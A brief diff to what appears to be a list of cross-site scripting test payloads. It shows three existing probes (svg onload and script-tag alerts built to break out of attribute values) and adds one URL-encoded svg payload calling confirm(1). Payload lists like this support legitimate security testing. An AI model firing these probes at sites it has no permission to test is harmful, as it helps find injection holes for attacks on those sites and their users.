@@ -3,3 +3,4 @@
 ab@gmail.com'\"><svg/onload=alert(/xss/)>
 http://example.com/services"><script>alert(1)</script>/services/
 KaOdcRYSw6jhu"><script>alert(document.domain)</script>vzsui
+"%3cSvg%20Only%3d1%20OnLoad%3dconfirm(1)%3e"
